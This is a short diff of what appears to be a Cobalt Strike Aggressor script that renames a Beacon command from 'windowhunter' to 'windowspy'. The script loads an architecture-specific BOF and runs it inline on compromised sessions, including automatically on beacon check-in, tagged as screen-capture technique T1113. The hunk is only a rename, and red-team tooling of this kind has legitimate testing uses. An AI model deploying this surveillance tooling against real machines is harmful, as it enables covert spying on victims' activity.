@@ -30,26 +30,26 @@ sub spy{
 
 #Register command
 beacon_command_register(
-    "windowhunter",
-    "windowhunter",
-    "Use: windowhunter"
+    "windowspy",
+    "windowspy",
+    "Use: windowspy"
 );
 
-alias windowhunter {
+alias windowspy {
     local('$bid $barch $handle $data $args $target_pid');
     $bid = $1;
     # figure out the arch of this session
     $barch  = barch($bid);
 
     # read in the right BOF file
-    $handle = openf(script_resource("WindowHunter. $+ $barch $+ .obj"));
+    $handle = openf(script_resource("WindowSpy. $+ $barch $+ .obj"));
     $data = readb($handle, -1);
     closef($handle);
     
     $args   = bof_pack($bid);
 
     # announce what we're doing
-    btask($bid, "Running WindowHunter by (@codex_tf2)", "T1113");
+    btask($bid, "Running WindowSpy by (@codex_tf2)", "T1113");
     # execute it.
     beacon_inline_execute($bid, $data, "go", $args);
 }
@@ -61,7 +61,7 @@ on beacon_checkin {
     $barch  = barch($bid);
 
     # read in the right BOF file
-    $handle = openf(script_resource("WindowHunter. $+ $barch $+ .obj"));
+    $handle = openf(script_resource("WindowSpy. $+ $barch $+ .obj"));
     $data = readb($handle, -1);
     closef($handle);
     
